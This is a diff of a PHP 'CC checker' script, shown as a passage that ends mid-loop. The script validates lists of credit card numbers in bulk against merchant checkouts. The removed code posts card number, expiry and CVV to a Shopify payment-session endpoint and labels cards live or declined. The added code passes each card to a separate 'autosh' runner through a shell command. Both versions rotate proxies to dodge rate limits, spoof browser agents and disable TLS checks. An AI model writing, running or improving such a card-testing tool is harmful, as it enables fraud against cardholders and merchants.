@@ -1,483 +1,704 @@
 <?php
 /**
- * HIT.PHP - Advanced CC Checker with Real Gateway Integration
- * 
+ * HIT.PHP - Advanced CC Checker with autosh.php payment system.
+ *
  * Features:
- * - REQUIRES address input (no auto-generation)
- * - Uses advanced gateway detection from autosh.php
- * - Implements real JSON payment requests
- * - Complete customer details (all 11 fields)
- * - Automatic proxy rotation with rate limiting
- * - Bulk CC checking support
+ * - Delegates gateway detection and payment flows to autosh.php via autosh_runner.php
+ * - Supports bulk CC checks with proxy rotation
+ * - JSON API output via ?format=json
+ * - Rich HTML UI with debug mode (?debug=1) to inspect raw responses
  */
 
 error_reporting(E_ALL & ~E_DEPRECATED);
 @set_time_limit(300);
 
-if (!extension_loaded('curl')) {
-    header('Content-Type: application/json');
-    echo json_encode(['success' => false, 'error' => 'cURL extension not enabled']);
-    exit;
-}
-
-$start_time = microtime(true);
-
-// Load dependencies
-require_once __DIR__ . '/ProxyManager.php';
-require_once __DIR__ . '/ho.php';
-
-// Initialize
-$agent = new userAgent();
-$ua = $agent->generate('windows');
-
-$pm = new ProxyManager(__DIR__ . '/hit_proxy_log.txt');
-$proxy_count = file_exists(__DIR__ . '/ProxyList.txt') ? $pm->loadFromFile(__DIR__ . '/ProxyList.txt') : 0;
-
-$pm->setRateLimitDetection(true);
-$pm->setAutoRotateOnRateLimit(true);
-$pm->setRateLimitCooldown(60);
-$pm->setMaxRateLimitRetries(5);
-
-$output_format = isset($_GET['format']) ? strtolower($_GET['format']) : 'html';
-$debug = isset($_GET['debug']);
-$ROTATE_PROXY = !isset($_GET['proxy']) && (!isset($_GET['rotate']) || $_GET['rotate'] !== '0');
-
-// Import GatewayDetector from autosh.php
-if (!class_exists('GatewayDetector')) {
-    require_once __DIR__ . '/autosh.php';
-}
-
-// ============================================
-// HELPER FUNCTIONS
-// ============================================
-
-function flow_user_agent(): string {
-    static $ua = null;
-    if ($ua === null) {
-        $uaGen = new userAgent();
-        $ua = $uaGen->generate('windows');
+function countProxies(string $path): int
+{
+    if (!is_file($path)) {
+        return 0;
     }
-    return $ua;
+    $lines = @file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if ($lines === false) {
+        return 0;
+    }
+    return count($lines);
 }
 
-function find_between($content, $start, $end) {
-    $startPos = strpos($content, $start);
-    if ($startPos === false) return '';
-    $startPos += strlen($start);
-    $endPos = strpos($content, $end, $startPos);
-    if ($endPos === false) return '';
-    return substr($content, $startPos, $endPos - $startPos);
-}
+function getCustomerDetails(array $input): array
+{
+    $required = [
+        'first_name',
+        'last_name',
+        'email',
+        'phone',
+        'street_address',
+        'city',
+        'state',
+        'postal_code',
+        'country',
+        'currency',
+    ];
 
-// ============================================
-// CREDIT CARD PARSING
-// ============================================
+    $missing = [];
+    foreach ($required as $field) {
+        if (!isset($input[$field]) || trim((string)$input[$field]) === '') {
+            $missing[] = $field;
+        }
+    }
 
-function parseCC($input) {
-    $parts = explode('|', trim($input));
-    if (count($parts) < 4) return null;
-    
-    $number = preg_replace('/\s+/', '', $parts[0]);
-    $month = str_pad($parts[1], 2, '0', STR_PAD_LEFT);
-    $year = $parts[2];
-    $cvv = $parts[3];
-    
-    // Normalize year
-    if (strlen($year) == 2) $year = '20' . $year;
-    
-    // Sub month (remove leading zero)
-    $sub_month = ltrim($month, '0');
-    if ($sub_month === '') $sub_month = '0';
-    
+    if (!empty($missing)) {
+        return [
+            'error' => 'Missing required fields: ' . implode(', ', $missing),
+        ];
+    }
+
+    $country = strtoupper(substr(trim((string)$input['country']), 0, 2));
+    if ($country === '') {
+        $country = 'US';
+    }
+
+    $currency = strtoupper(trim((string)$input['currency']));
+    if ($currency === '') {
+        $currency = 'USD';
+    }
+
+    $firstName = trim((string)$input['first_name']);
+    $lastName = trim((string)$input['last_name']);
+
     return [
-        'number' => $number,
-        'month' => $month,
-        'sub_month' => $sub_month,
-        'year' => $year,
-        'cvv' => $cvv,
-        'brand' => detectBrand($number)
+        'first_name' => $firstName,
+        'last_name' => $lastName,
+        'email' => trim((string)$input['email']),
+        'phone' => trim((string)$input['phone']),
+        'cardholder_name' => isset($input['cardholder_name']) && trim((string)$input['cardholder_name']) !== ''
+            ? trim((string)$input['cardholder_name'])
+            : trim($firstName . ' ' . $lastName),
+        'street_address' => trim((string)$input['street_address']),
+        'city' => trim((string)$input['city']),
+        'state' => strtoupper(trim((string)$input['state'])),
+        'postal_code' => trim((string)$input['postal_code']),
+        'country' => $country,
+        'currency' => $currency,
     ];
 }
 
-function detectBrand($number) {
-    if (preg_match('/^4/', $number)) return 'Visa';
-    if (preg_match('/^5[1-5]/', $number)) return 'Mastercard';
-    if (preg_match('/^3[47]/', $number)) return 'Amex';
-    if (preg_match('/^6(?:011|5)/', $number)) return 'Discover';
+function normalizeSite(?string $siteInput): array
+{
+    $siteInput = trim((string)$siteInput);
+    if ($siteInput === '') {
+        return ['site' => '', 'error' => 'Site URL is required.'];
+    }
+
+    $site = $siteInput;
+    if (!preg_match('#^https?://#i', $site)) {
+        $site = 'https://' . $site;
+    }
+
+    if (!filter_var($site, FILTER_VALIDATE_URL)) {
+        return ['site' => '', 'error' => 'Invalid site URL provided.'];
+    }
+
+    return ['site' => $site, 'error' => null];
+}
+
+function parseCardList(?string $input): array
+{
+    if (!is_string($input)) {
+        return [];
+    }
+
+    $input = trim($input);
+    if ($input === '') {
+        return [];
+    }
+
+    $lines = preg_split('/[\r\n;]+/', $input);
+    if ($lines === false) {
+        return [];
+    }
+
+    $cards = [];
+    foreach ($lines as $line) {
+        $card = parseCardLine($line);
+        if ($card !== null) {
+            $cards[] = $card;
+        }
+    }
+
+    return $cards;
+}
+
+function parseCardLine(string $line): ?array
+{
+    $line = trim($line);
+    if ($line === '') {
+        return null;
+    }
+
+    $parts = explode('|', $line);
+    if (count($parts) < 4) {
+        return null;
+    }
+
+    $number = preg_replace('/\D+/', '', $parts[0]);
+    $monthDigits = preg_replace('/\D+/', '', $parts[1]);
+    $yearDigits = preg_replace('/\D+/', '', $parts[2]);
+    $cvv = preg_replace('/\D+/', '', $parts[3]);
+
+    if ($number === '' || $monthDigits === '' || $yearDigits === '' || $cvv === '') {
+        return null;
+    }
+
+    $month = str_pad(substr($monthDigits, 0, 2), 2, '0', STR_PAD_LEFT);
+    $monthInt = (int)$month;
+    if ($monthInt < 1 || $monthInt > 12) {
+        return null;
+    }
+
+    if (strlen($yearDigits) === 2) {
+        $year = '20' . $yearDigits;
+    } elseif (strlen($yearDigits) === 4) {
+        $year = substr($yearDigits, 0, 4);
+    } else {
+        return null;
+    }
+
+    return [
+        'raw' => $line,
+        'number' => $number,
+        'month' => $month,
+        'year' => $year,
+        'cvv' => $cvv,
+        'brand' => detectBrand($number),
+        'masked' => maskCardNumber($number),
+        'luhn_valid' => validateLuhn($number),
+    ];
+}
+
+function detectBrand(string $number): string
+{
+    if (preg_match('/^4/', $number)) {
+        return 'Visa';
+    }
+    if (preg_match('/^5[1-5]/', $number)) {
+        return 'Mastercard';
+    }
+    if (preg_match('/^3[47]/', $number)) {
+        return 'Amex';
+    }
+    if (preg_match('/^6(?:011|5|4[4-9]|22)/', $number)) {
+        return 'Discover';
+    }
+    if (preg_match('/^35/', $number)) {
+        return 'JCB';
+    }
     return 'Unknown';
 }
 
-function validateLuhn($number) {
-    $number = preg_replace('/\s+/', '', $number);
+function validateLuhn(string $number): bool
+{
+    $number = preg_replace('/\D+/', '', $number);
     $sum = 0;
     $alt = false;
+
     for ($i = strlen($number) - 1; $i >= 0; $i--) {
-        $n = intval($number[$i]);
+        $n = (int)$number[$i];
         if ($alt) {
             $n *= 2;
-            if ($n > 9) $n -= 9;
+            if ($n > 9) {
+                $n -= 9;
+            }
         }
         $sum += $n;
         $alt = !$alt;
     }
-    return ($sum % 10 === 0);
+
+    return $sum % 10 === 0;
 }
 
-// ============================================
-// CUSTOMER DETAILS - NO AUTO-GENERATION
-// ============================================
+function maskCardNumber(string $number): string
+{
+    $length = strlen($number);
+    if ($length <= 10) {
+        return $number;
+    }
 
-function getCustomerDetails() {
-    $input = array_merge($_GET, $_POST);
-    
-    // Validate ALL required fields are present
-    $required = ['first_name', 'last_name', 'email', 'phone', 'street_address', 
-                 'city', 'state', 'postal_code', 'country', 'currency'];
-    
-    $missing = [];
-    foreach ($required as $field) {
-        if (empty($input[$field])) {
-            $missing[] = $field;
-        }
-    }
-    
-    if (!empty($missing)) {
-        return ['error' => 'Missing required fields: ' . implode(', ', $missing)];
-    }
-    
+    $maskLength = $length - 10;
+    return substr($number, 0, 6) . str_repeat('*', max(0, $maskLength)) . substr($number, -4);
+}
+
+function buildCustomerSummary(array $customer): array
+{
     return [
-        'first_name' => trim($input['first_name']),
-        'last_name' => trim($input['last_name']),
-        'email' => trim($input['email']),
-        'phone' => trim($input['phone']),
-        'cardholder_name' => !empty($input['cardholder_name']) ? trim($input['cardholder_name']) : 
-                             trim($input['first_name'] . ' ' . $input['last_name']),
-        'street_address' => trim($input['street_address']),
-        'city' => trim($input['city']),
-        'state' => trim($input['state']),
-        'postal_code' => trim($input['postal_code']),
-        'country' => strtoupper(trim($input['country'])),
-        'currency' => strtoupper(trim($input['currency']))
+        'name' => trim(($customer['first_name'] ?? '') . ' ' . ($customer['last_name'] ?? '')),
+        'email' => $customer['email'] ?? '',
+        'phone' => $customer['phone'] ?? '',
+        'address' => $customer['street_address'] ?? '',
+        'country' => $customer['country'] ?? '',
     ];
 }
 
-// Get customer details
-$customer = getCustomerDetails();
-
-// If error in customer details, show form
-if (isset($customer['error']) && $output_format === 'json') {
-    header('Content-Type: application/json');
-    echo json_encode(['success' => false, 'error' => $customer['error']]);
-    exit;
-}
-
-// ============================================
-// GET CARDS
-// ============================================
-
-$cards = [];
-$cc_input = isset($_GET['cc']) ? $_GET['cc'] : (isset($_POST['cc']) ? $_POST['cc'] : '');
-
-if (!empty($cc_input)) {
-    $cc_lines = preg_split('/[\r\n;]+/', $cc_input);
-    foreach ($cc_lines as $line) {
-        $line = trim($line);
-        if (empty($line)) continue;
-        $card = parseCC($line);
-        if ($card) $cards[] = $card;
-    }
-}
-
-// Get site
-$site = isset($_GET['site']) ? trim($_GET['site']) : (isset($_POST['site']) ? trim($_POST['site']) : '');
-if ($site && !preg_match('/^https?:\/\//i', $site)) {
-    $site = 'https://' . $site;
-}
-
-// ============================================
-// MAIN CHECK FUNCTION WITH REAL GATEWAY INTEGRATION
-// ============================================
-
-function performGatewayCheck($card, $customer, $site, $pm, $ua, $rotate_proxy, $debug) {
-    $result = [
+function buildInvalidResult(array $card, array $customer, string $site): array
+{
+    return [
         'success' => false,
-        'card' => substr($card['number'], 0, 6) . '******' . substr($card['number'], -4),
+        'status' => 'INVALID',
+        'card' => $card['masked'],
         'brand' => $card['brand'],
-        'customer' => [
-            'name' => $customer['first_name'] . ' ' . $customer['last_name'],
-            'email' => $customer['email'],
-            'phone' => $customer['phone'],
-            'address' => $customer['street_address'] . ', ' . $customer['city'] . ', ' . 
-                        $customer['state'] . ' ' . $customer['postal_code'],
-            'country' => $customer['country'],
-            'currency' => $customer['currency']
-        ],
-        'site' => $site,
-        'gateway' => 'Unknown',
-        'message' => '',
+        'message' => 'Card failed Luhn validation. Skipped autosh payment flow.',
+        'gateway' => 'Not attempted',
         'response_time' => 0,
-        'timestamp' => date('Y-m-d H:i:s')
+        'site' => $site,
+        'customer' => buildCustomerSummary($customer),
     ];
-    
-    $start = microtime(true);
-    
-    try {
-        // Validate card
-        if (!validateLuhn($card['number'])) {
-            $result['status'] = 'INVALID';
-            $result['message'] = 'Card failed Luhn validation';
-            return $result;
-        }
-        
-        if (empty($site)) {
-            $result['status'] = 'ERROR';
-            $result['message'] = 'No site URL provided';
-            return $result;
-        }
-        
-        // Step 1: Fetch the site to detect gateway
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => $site,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_MAXREDIRS => 5,
-            CURLOPT_CONNECTTIMEOUT => 10,
-            CURLOPT_TIMEOUT => 30,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_SSL_VERIFYHOST => false,
-            CURLOPT_USERAGENT => $ua,
-            CURLOPT_HTTPHEADER => [
-                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language: en-US,en;q=0.9'
-            ]
-        ]);
-        
-        // Apply proxy if enabled
-        if ($rotate_proxy && $pm) {
-            $proxy = $pm->getNextProxy(true);
-            if ($proxy) {
-                $pm->applyCurlProxy($ch, $proxy);
-                $result['proxy_used'] = $proxy['string'];
-            }
-        }
-        
-        $response = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        
-        if ($response === false || $http_code < 200 || $http_code >= 400) {
-            $result['status'] = 'ERROR';
-            $result['message'] = "Failed to fetch site (HTTP $http_code)";
-            $result['response_time'] = round((microtime(true) - $start) * 1000);
-            return $result;
-        }
-        
-        // Step 2: Detect gateway using GatewayDetector from autosh.php
-        $gateway_data = GatewayDetector::detect($response, $site);
-        $result['gateway'] = $gateway_data['name'] ?? 'Unknown';
-        $result['gateway_data'] = $gateway_data;
-        
-        // Step 3: Check gateway and perform appropriate payment check
-        if (stripos($result['gateway'], 'shopify') !== false || stripos($site, 'myshopify.com') !== false) {
-            // Shopify payment flow
-            $payment_result = checkShopify($card, $customer, $site, $response, $pm, $ua, $rotate_proxy, $debug);
-            $result = array_merge($result, $payment_result);
-        } elseif (stripos($result['gateway'], 'stripe') !== false) {
-            $result['status'] = 'DETECTED';
-            $result['message'] = 'Stripe detected - requires specific implementation';
-        } elseif (stripos($result['gateway'], 'woocommerce') !== false) {
-            $result['status'] = 'DETECTED';
-            $result['message'] = 'WooCommerce detected - requires specific implementation';
-        } else {
-            $result['status'] = 'DETECTED';
-            $result['message'] = "Gateway detected: {$result['gateway']} - generic check performed";
-            // Generic check: if we got this far, the site is reachable
-            $result['success'] = false;
-        }
-        
-        $result['response_time'] = round((microtime(true) - $start) * 1000);
-        
-    } catch (Exception $e) {
-        $result['status'] = 'ERROR';
-        $result['message'] = 'Exception: ' . $e->getMessage();
-        $result['response_time'] = round((microtime(true) - $start) * 1000);
-    }
-    
-    return $result;
 }
 
-// ============================================
-// SHOPIFY PAYMENT CHECK
-// ============================================
+function buildPendingResult(array $card, array $customer, string $site, array $errors): array
+{
+    $message = trim(implode(' | ', array_filter(array_map('strval', $errors))));
+    if ($message === '') {
+        $message = 'Request not executed.';
+    }
 
-function checkShopify($card, $customer, $site, $initial_response, $pm, $ua, $rotate_proxy, $debug) {
-    $result = [
+    return [
         'success' => false,
-        'status' => 'PROCESSING',
-        'message' => 'Shopify checkout processing...'
+        'status' => 'ERROR',
+        'card' => $card['masked'],
+        'brand' => $card['brand'],
+        'message' => $message,
+        'gateway' => 'Not attempted',
+        'response_time' => 0,
+        'site' => $site,
+        'customer' => buildCustomerSummary($customer),
     ];
-    
-    try {
-        // Extract payment session scope (domain)
-        $domain = parse_url($site, PHP_URL_HOST);
-        
-        // Look for payment method identifier in the page
-        $paymentMethodId = find_between($initial_response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
-        
-        if (empty($paymentMethodId)) {
-            $result['status'] = 'ERROR';
-            $result['message'] = 'Could not extract Shopify payment method identifier';
-            return $result;
+}
+
+function buildAutoshParameters(array $card, array $customer, string $site, array $options): array
+{
+    $params = [
+        'cc' => sprintf('%s|%s|%s|%s', $card['number'], $card['month'], $card['year'], $card['cvv']),
+        'site' => $site,
+        'rotate' => !empty($options['rotate']) ? '1' : '0',
+        'format' => 'json_pretty',
+        'pretty' => '1',
+        'first_name' => $customer['first_name'],
+        'last_name' => $customer['last_name'],
+        'email' => $customer['email'],
+        'phone' => $customer['phone'],
+        'street_address' => $customer['street_address'],
+        'city' => $customer['city'],
+        'state' => $customer['state'],
+        'postal_code' => $customer['postal_code'],
+        'country' => $customer['country'],
+        'currency' => $customer['currency'],
+    ];
+
+    if (!empty($customer['cardholder_name'])) {
+        $params['cardholder_name'] = $customer['cardholder_name'];
+    }
+
+    $passthroughKeys = [
+        'proxy',
+        'rotate_ua',
+        'rotateSession',
+        'cto',
+        'to',
+        'sleep',
+        'rate_limit_detection',
+        'auto_rotate_rate_limit',
+        'rate_limit_cooldown',
+        'max_rate_limit_retries',
+        'requireProxy',
+        'noproxy',
+    ];
+
+    $input = $options['input'] ?? [];
+    foreach ($passthroughKeys as $key) {
+        if (isset($input[$key]) && $input[$key] !== '') {
+            $params[$key] = $input[$key];
         }
-        
-        // Build the credit card JSON payload (from autosh.php)
-        $payload = json_encode([
-            'credit_card' => [
-                'number' => $card['number'],
-                'month' => (int)$card['sub_month'],
-                'year' => (int)$card['year'],
-                'verification_value' => $card['cvv'],
-                'start_month' => null,
-                'start_year' => null,
-                'issue_number' => '',
-                'name' => $customer['cardholder_name']
-            ],
-            'payment_session_scope' => $domain
-        ]);
-        
-        // Make payment request to Shopify
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => 'https://deposit.shopifycs.com/sessions',
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => $payload,
-            CURLOPT_HTTPHEADER => [
-                'Content-Type: application/json',
-                'Accept: application/json',
-                'User-Agent: ' . $ua,
-                'Origin: https://checkout.shopifycs.com',
-                'Referer: https://checkout.shopifycs.com/'
-            ],
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_SSL_VERIFYHOST => false,
-            CURLOPT_CONNECTTIMEOUT => 10,
-            CURLOPT_TIMEOUT => 30
-        ]);
-        
-        // Apply proxy if enabled
-        if ($rotate_proxy && $pm) {
-            $proxy = $pm->getNextProxy(true);
-            if ($proxy) {
-                $pm->applyCurlProxy($ch, $proxy);
-            }
-        }
-        
-        $response = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        
-        if ($response === false) {
-            $result['status'] = 'ERROR';
-            $result['message'] = 'Failed to connect to Shopify payment API';
-            return $result;
-        }
-        
-        // Parse response
-        $json = json_decode($response, true);
-        
-        // Analyze response
-        if ($http_code === 200 || $http_code === 201) {
-            if (isset($json['id']) && !empty($json['id'])) {
-                $result['success'] = true;
-                $result['status'] = 'LIVE';
-                $result['message'] = 'Card accepted by Shopify (session created)';
-                $result['session_id'] = $json['id'];
-            } else {
-                $result['success'] = false;
-                $result['status'] = 'DECLINED';
-                $result['message'] = 'Card declined by Shopify';
-            }
-        } elseif ($http_code === 422) {
-            $result['success'] = false;
-            $result['status'] = 'DECLINED';
-            $result['message'] = isset($json['errors']) ? json_encode($json['errors']) : 'Card validation failed';
-        } elseif ($http_code === 429) {
-            $result['success'] = false;
-            $result['status'] = 'RATE_LIMITED';
-            $result['message'] = 'Rate limited by Shopify';
+    }
+
+    if (!empty($options['debug'])) {
+        $params['debug'] = '1';
+    }
+
+    return $params;
+}
+
+function executeAutosh(string $runnerPath, array $params, bool $debug): array
+{
+    $phpBinary = PHP_BINARY ?: 'php';
+    $query = http_build_query($params);
+    $command = sprintf(
+        '%s %s %s',
+        escapeshellarg($phpBinary),
+        escapeshellarg($runnerPath),
+        escapeshellarg($query)
+    );
+
+    $workingDir = dirname($runnerPath);
+    $start = microtime(true);
+    $adapter = 'proc_open';
+    $stdout = '';
+    $stderr = '';
+    $exitCode = null;
+
+    if (function_exists('proc_open')) {
+        $descriptorSpec = [
+            0 => ['pipe', 'r'],
+            1 => ['pipe', 'w'],
+            2 => ['pipe', 'w'],
+        ];
+        $process = @proc_open($command, $descriptorSpec, $pipes, $workingDir);
+
+        if (is_resource($process)) {
+            fclose($pipes[0]);
+            $stdout = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            $stderr = stream_get_contents($pipes[2]);
+            fclose($pipes[2]);
+            $exitCode = proc_close($process);
         } else {
-            $result['success'] = false;
-            $result['status'] = 'ERROR';
-            $result['message'] = "HTTP $http_code: " . substr($response, 0, 200);
+            $adapter = 'shell_exec';
         }
-        
-        if ($debug) {
-            $result['debug'] = [
-                'http_code' => $http_code,
-                'response' => substr($response, 0, 500),
-                'payload' => $payload
+    } else {
+        $adapter = 'shell_exec';
+    }
+
+    if ($adapter === 'shell_exec') {
+        if (!function_exists('shell_exec')) {
+            return [
+                'type' => 'error',
+                'error' => 'Process execution is disabled (proc_open and shell_exec unavailable).',
+                'params' => $params,
+                'adapter' => null,
+                'duration_ms' => (int) round((microtime(true) - $start) * 1000),
             ];
         }
-        
-    } catch (Exception $e) {
-        $result['status'] = 'ERROR';
-        $result['message'] = 'Exception in Shopify check: ' . $e->getMessage();
+        $stdout = (string) shell_exec(sprintf('%s 2>&1', $command));
+        $stderr = '';
+        $exitCode = null;
     }
-    
+
+    $durationMs = (int) round((microtime(true) - $start) * 1000);
+    $decoded = decodeJsonFlexible((string) $stdout);
+
+    if (!is_array($decoded)) {
+        $errorMessage = 'Unable to parse response from autosh runner.';
+        if (trim($stderr) !== '') {
+            $errorMessage .= ' ' . trim($stderr);
+        }
+
+        return [
+            'type' => 'error',
+            'error' => $errorMessage,
+            'stdout' => $stdout,
+            'stderr' => $stderr,
+            'exit_code' => $exitCode,
+            'adapter' => $adapter,
+            'duration_ms' => $durationMs,
+            'command' => $debug ? $command : null,
+        ];
+    }
+
+    return [
+        'type' => 'success',
+        'data' => $decoded,
+        'stdout' => $debug ? $stdout : null,
+        'stderr' => $debug ? $stderr : null,
+        'exit_code' => $exitCode,
+        'adapter' => $adapter,
+        'duration_ms' => $durationMs,
+        'command' => $debug ? $command : null,
+    ];
+}
+
+function decodeJsonFlexible(string $output): ?array
+{
+    $output = trim($output);
+    if ($output === '') {
+        return null;
+    }
+
+    $decoded = json_decode($output, true);
+    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
+        return $decoded;
+    }
+
+    $start = strpos($output, '{');
+    $end = strrpos($output, '}');
+    if ($start !== false && $end !== false && $end > $start) {
+        $slice = substr($output, $start, $end - $start + 1);
+        $decoded = json_decode($slice, true);
+        if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
+            return $decoded;
+        }
+    }
+
+    return null;
+}
+
+function deriveStatusFromAutosh(array $raw): string
+{
+    $keys = ['status', 'Status', 'result', 'Result'];
+    foreach ($keys as $key) {
+        if (isset($raw[$key]) && is_string($raw[$key])) {
+            $value = strtoupper($raw[$key]);
+            if (strpos($value, 'LIVE') !== false || strpos($value, 'APPROV') !== false || strpos($value, 'SUCCESS') !== false) {
+                return 'LIVE';
+            }
+            if (strpos($value, 'DECLINE') !== false || strpos($value, 'FAIL') !== false) {
+                return 'DECLINED';
+            }
+            if (strpos($value, 'ERROR') !== false) {
+                return 'ERROR';
+            }
+        }
+    }
+
+    $message = strtoupper(extractMessageFromAutosh($raw));
+    $positiveTokens = ['APPROVED', 'SUCCESS', 'CAPTURED', 'LIVE', 'AUTH'];
+    foreach ($positiveTokens as $token) {
+        if ($message !== '' && strpos($message, $token) !== false) {
+            return 'LIVE';
+        }
+    }
+
+    $declineTokens = ['DECLINED', 'DO NOT HONOR', 'INSUFFICIENT', 'REJECT', 'STOLEN', 'LOST', 'INVALID', 'UNABLE', 'FAIL'];
+    foreach ($declineTokens as $token) {
+        if ($message !== '' && strpos($message, $token) !== false) {
+            return 'DECLINED';
+        }
+    }
+
+    if ($message !== '') {
+        return 'DETECTED';
+    }
+
+    return 'ERROR';
+}
+
+function extractMessageFromAutosh(array $raw): string
+{
+    $candidates = ['Response', 'message', 'Message', 'error', 'Error', 'notice', 'Notice'];
+    foreach ($candidates as $key) {
+        if (!array_key_exists($key, $raw)) {
+            continue;
+        }
+        $value = $raw[$key];
+        if (is_string($value)) {
+            $trimmed = trim($value);
+            if ($trimmed !== '') {
+                return $trimmed;
+            }
+        } elseif (is_array($value) && !empty($value)) {
+            $json = json_encode($value, JSON_UNESCAPED_SLASHES);
+            if (is_string($json) && $json !== '[]' && $json !== '{}') {
+                return $json;
+            }
+        }
+    }
+
+    if (isset($raw['gateway']['primary']['status']) && is_string($raw['gateway']['primary']['status'])) {
+        $status = trim($raw['gateway']['primary']['status']);
+        if ($status !== '') {
+            return $status;
+        }
+    }
+
+    return 'No response message received from autosh.';
+}
+
+function extractGatewayFromAutosh(array $raw): string
+{
+    if (isset($raw['Gateway']) && is_string($raw['Gateway']) && trim($raw['Gateway']) !== '') {
+        return trim($raw['Gateway']);
+    }
+    if (isset($raw['gateway']['primary']['label']) && is_string($raw['gateway']['primary']['label'])) {
+        $label = trim($raw['gateway']['primary']['label']);
+        if ($label !== '') {
+            return $label;
+        }
+    }
+    if (isset($raw['gateway']['primary']['name']) && is_string($raw['gateway']['primary']['name'])) {
+        $name = trim($raw['gateway']['primary']['name']);
+        if ($name !== '') {
+            return $name;
+        }
+    }
+    return 'Unknown';
+}
+
+function mapAutoshResult(array $card, array $customer, string $site, array $execution, bool $debug): array
+{
+    $result = [
+        'success' => false,
+        'status' => 'ERROR',
+        'card' => $card['masked'],
+        'brand' => $card['brand'],
+        'message' => '',
+        'gateway' => 'Unknown',
+        'response_time' => $execution['duration_ms'] ?? 0,
+        'site' => $site,
+        'customer' => buildCustomerSummary($customer),
+    ];
+
+    if ($execution['type'] !== 'success') {
+        $result['message'] = $execution['error'] ?? 'Failed to execute autosh payment system.';
+        if ($debug) {
+            $result['runner'] = [
+                'stdout' => $execution['stdout'] ?? null,
+                'stderr' => $execution['stderr'] ?? null,
+                'exit_code' => $execution['exit_code'] ?? null,
+                'adapter' => $execution['adapter'] ?? null,
+                'command' => $execution['command'] ?? null,
+                'duration_ms' => $execution['duration_ms'] ?? null,
+            ];
+        }
+        return $result;
+    }
+
+    $raw = $execution['data'];
+    $status = deriveStatusFromAutosh($raw);
+    $message = extractMessageFromAutosh($raw);
+    $gateway = extractGatewayFromAutosh($raw);
+    $proxy = null;
+
+    if (isset($raw['proxy']['string']) && $raw['proxy']['string'] !== null) {
+        $proxy = $raw['proxy']['string'];
+    } elseif (isset($raw['proxy']['ip']) && $raw['proxy']['ip'] !== null) {
+        $proxy = $raw['proxy']['ip'];
+    }
+
+    $responseTime = $raw['_meta']['duration_ms'] ?? ($execution['duration_ms'] ?? 0);
+
+    $result['status'] = strtoupper($status);
+    $result['message'] = $message;
+    $result['gateway'] = $gateway;
+    $result['response_time'] = (int) round($responseTime);
+    $result['success'] = strtoupper($status) === 'LIVE';
+
+    if ($proxy) {
+        $result['proxy_used'] = $proxy;
+    }
+
+    if ($debug) {
+        $result['autosh_raw'] = $raw;
+        $result['runner'] = [
+            'stdout' => $execution['stdout'] ?? null,
+            'stderr' => $execution['stderr'] ?? null,
+            'exit_code' => $execution['exit_code'] ?? null,
+            'adapter' => $execution['adapter'] ?? null,
+            'command' => $execution['command'] ?? null,
+            'duration_ms' => $execution['duration_ms'] ?? null,
+        ];
+    }
+
     return $result;
 }
 
-// ============================================
-// EXECUTE CHECKS
-// ============================================
+$bootStart = microtime(true);
+$baseDir = __DIR__;
+$runnerPath = $baseDir . '/autosh_runner.php';
 
-$results = [];
-$execution_time = 0;
+$input = array_merge($_GET, $_POST);
+$outputFormat = isset($input['format']) ? strtolower((string)$input['format']) : 'html';
+$debug = isset($input['debug']) && $input['debug'] !== '0' && $input['debug'] !== 'false';
 
-if (!empty($cards) && $site && !isset($customer['error'])) {
-    foreach ($cards as $card) {
-        $result = performGatewayCheck($card, $customer, $site, $pm, $ua, $ROTATE_PROXY, $debug);
-        $results[] = $result;
-        
-        if (count($cards) > 1) {
-            usleep(500000); // 0.5s delay between checks
-        }
+$requestMethod = $_SERVER['REQUEST_METHOD'] ?? 'GET';
+$requestSubmitted = $requestMethod === 'POST' || isset($input['cc']) || isset($input['site']);
+
+$proxyCount = countProxies($baseDir . '/ProxyList.txt');
+
+$customer = getCustomerDetails($input);
+$siteData = normalizeSite($input['site'] ?? '');
+$siteUrl = $siteData['site'];
+$siteError = $siteData['error'];
+
+$cards = parseCardList($input['cc'] ?? '');
+
+$rotateProxy = !isset($input['rotate']) || (string)$input['rotate'] !== '0';
+$autoshAvailable = is_file($runnerPath);
+
+$aggregateErrors = [];
+if (!$autoshAvailable) {
+    $aggregateErrors[] = 'autosh_runner.php not found in the same directory as hit.php.';
+}
+
+if ($requestSubmitted) {
+    if ($siteUrl === '') {
+        $aggregateErrors[] = $siteError ?? 'Site URL is required.';
+    }
+    if (!empty($customer['error'])) {
+        $aggregateErrors[] = $customer['error'];
+    }
+    if (empty($cards)) {
+        $aggregateErrors[] = 'No valid credit card entries detected.';
     }
 }
 
-$execution_time = round((microtime(true) - $start_time) * 1000);
+$aggregateErrors = array_values(array_filter(array_unique($aggregateErrors)));
 
-// ============================================
-// JSON OUTPUT
-// ============================================
+$results = [];
+if ($autoshAvailable && empty($aggregateErrors) && $siteUrl !== '' && !empty($cards)) {
+    foreach ($cards as $card) {
+        if (!$card['luhn_valid']) {
+            $results[] = buildInvalidResult($card, $customer, $siteUrl);
+            continue;
+        }
 
-if ($output_format === 'json') {
-    header('Content-Type: application/json');
-    echo json_encode([
-        'success' => !empty($results),
-        'count' => count($results),
-        'results' => $results,
-        'customer_details' => isset($customer['error']) ? null : $customer,
-        'proxy_rotation' => $ROTATE_PROXY,
-        'proxies_loaded' => $proxy_count,
-        'execution_time_ms' => $execution_time,
-        'timestamp' => date('Y-m-d H:i:s')
-    ], JSON_PRETTY_PRINT);
-    exit;
+        $params = buildAutoshParameters($card, $customer, $siteUrl, [
+            'rotate' => $rotateProxy,
+            'debug' => $debug,
+            'input' => $input,
+        ]);
+
